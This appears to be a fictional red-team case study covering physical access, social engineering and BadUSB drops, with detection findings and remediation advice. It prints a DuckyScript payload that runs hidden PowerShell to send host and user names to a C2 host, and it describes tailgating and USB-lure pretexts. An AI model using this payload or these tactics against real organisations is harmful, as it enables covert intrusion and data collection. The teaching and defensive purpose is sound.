# Case Study 02: Red Team Physical Engagement

## Scenario Overview

**Client:** TechCorp Industries (fictional)
**Engagement Type:** Full-scope Red Team Assessment
**Duration:** 2 weeks
**Objective:** Test physical security and user awareness
**Scope:** Social engineering + physical access + BadUSB

---

## Engagement Summary

### Objectives

1. Test effectiveness of physical access controls
2. Assess employee security awareness
3. Demonstrate BadUSB attack viability
4. Evaluate detection and response capabilities

### Rules of Engagement

- No destructive actions
- No actual data exfiltration (simulated only)
- Physical testing limited to business hours
- Emergency contact card provided
- All activities logged

---

## Phase 1: Reconnaissance (Week 1)

### OSINT Gathering

| Source | Information Obtained |
|--------|---------------------|
| LinkedIn | Employee names, roles, technologies used |
| Job Postings | Internal tools, security requirements |
| Google Maps | Building layout, entry points |
| Shodan | External infrastructure |
| Social Media | Employee habits, building photos |

### Physical Reconnaissance

**Day 1-2:** External observation
- Entry/exit points identified
- Tailgating opportunities noted
- Security guard shift changes documented
- Badge types observed

**Day 3:** Pretext development
- Created fake vendor identity
- Prepared business cards
- Developed cover story (IT vendor for printer maintenance)

---

## Phase 2: Physical Access (Week 2, Day 1)

### Entry Method: Tailgating

**09:15** - Arrived at target building

**09:23** - Tailgated through main entrance during morning rush
- Dressed in business casual + laptop bag
- Followed group through turnstile
- No challenge from security

**09:28** - Located target floor (Finance department)

**09:35** - Accessed empty conference room
- Connected to network jack
- Ran network enumeration
- Identified printer network

### USB Drop Execution

**10:15** - Placed 5 prepared USB drives:
- 2 in break room near coffee machine
- 1 near elevator on target floor
- 1 in lobby waiting area
- 1 in restroom (for comparison)

**USB Configuration:**
- Labeled "Confidential - CEO Compensation Review"
- Configured as Flipper Zero BadUSB
- Payload: Beacon to red team C2 (no malicious action)

---

## Phase 3: Payload Execution

### USB Drive Results

| Location | Time to Insert | User Role | Detected? |
|----------|---------------|-----------|-----------|
| Break Room #1 | 47 minutes | Accountant | No |
| Break Room #2 | 2 hours | IT Staff | Yes (after execution) |
| Elevator Area | Not inserted | N/A | N/A |
| Lobby | 3 hours | Visitor | No |
| Restroom | Not inserted | N/A | N/A |

### Beacon Payload

```
REM Red Team Beacon Payload
REM Non-destructive - logs only

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -c "$h=$env:COMPUTERNAME;$u=$env:USERNAME;IWR 'https://rt-c2.internal/beacon?host=$h&user=$u'"
ENTER
```

### Results

- **3 of 5** USB drives were inserted
- **2 of 3** resulted in successful beacons
- **1** was reported to IT (after execution)
- Average time to insert: 1.5 hours

---

## Phase 4: Post-Exploitation Simulation

### Simulated Attack Path

```
USB Insertion (Accountant Workstation)
          ↓
    PowerShell Beacon
          ↓
    Credential Harvesting (simulated)
          ↓
    Lateral Movement to File Server (simulated)
          ↓
    Data Access (Finance Share - simulated)
          ↓
    Exfiltration (simulated - tagged files)
```

### Access Achieved (Simulated)

| System | Access Level | Method |
|--------|-------------|--------|
| Workstation | User | BadUSB |
| File Server | Read | Cached credentials |
| Email | Read | Cached credentials |
| HR Portal | Limited | Session token |

---

## Detection Analysis

### What Security Controls Existed

| Control | Status | Effectiveness |
|---------|--------|---------------|
| USB Device Whitelisting | Not deployed | N/A |
| Antivirus | Deployed | Did not detect |
| SIEM | Deployed | Alert generated (ignored) |
| Physical Security | Guards present | Failed to prevent tailgate |
| Security Awareness | Training exists | 60% failure rate |

### Alerts Generated

| Time | Alert | Action Taken |
|------|-------|--------------|
| 09:45 | Unusual PowerShell execution | None |
| 10:02 | Outbound connection to unknown IP | None |
| 11:30 | New USB device connected | None |
| 14:00 | User reported suspicious USB | Investigated |

### Time to Detection

- **Automated Detection:** 45 minutes (alert generated)
- **Human Response:** 4 hours (user report)
- **IR Activation:** 5 hours
- **Full Investigation:** 8 hours

---

## Findings & Recommendations

### Critical Findings

1. **Physical Access Too Easy**
   - Tailgating successful with no challenge
   - No visitor management for internal floors
   - Recommendation: Implement turnstile access, visitor escorts

2. **USB Devices Not Controlled**
   - No technical controls on USB devices
   - Recommendation: Deploy USB device whitelisting via GPO

3. **Security Awareness Insufficient**
   - 60% of users would insert unknown USB
   - Recommendation: Enhanced training with BadUSB focus

4. **Alert Fatigue Present**
   - Valid alerts ignored for hours
   - Recommendation: Tune SIEM, implement escalation SLAs

### Positive Observations

1. SIEM generated valid alerts (detection capability exists)
2. One user reported suspicious USB (awareness partially effective)
3. IR team responded appropriately once activated
4. Network segmentation limited lateral movement

---

## Remediation Timeline

### Immediate (0-30 days)

- [ ] Deploy USB device restrictions via GPO
- [ ] Tune SIEM alerts for PowerShell abuse
- [ ] Implement 15-minute SLA for critical alerts
- [ ] Conduct emergency security awareness briefing

### Short-term (30-90 days)

- [ ] Physical security improvements (turnstiles, badges)
- [ ] Deploy Sysmon across all workstations
- [ ] Implement USB device logging
- [ ] Enhanced security awareness training

### Long-term (90-180 days)

- [ ] Zero Trust network architecture
- [ ] Endpoint Detection and Response (EDR) deployment
- [ ] Regular red team exercises
- [ ] Security champions program

---

## Appendix: Payload Details

### USB Drive Specifications

- **Device:** Flipper Zero with custom firmware
- **Appearance:** Standard 16GB flash drive enclosure
- **Label:** Printed "Confidential" sticker

### Beacon Server

- **Infrastructure:** AWS EC2 instance
- **Domain:** rt-c2.internal (controlled)
- **Logging:** Full request logging enabled
- **Duration:** Active for engagement period only

### Evidence Collected

- All beacon logs preserved
- Screenshots of access (simulated)
- Network traffic captures
- Timeline documentation

---

## Report Delivery

- Executive Summary presented to CISO
- Technical report to Security Team
- Remediation tracking in GRC platform
- 90-day retest scheduled

---

[← Back to Case Studies](./README.md)
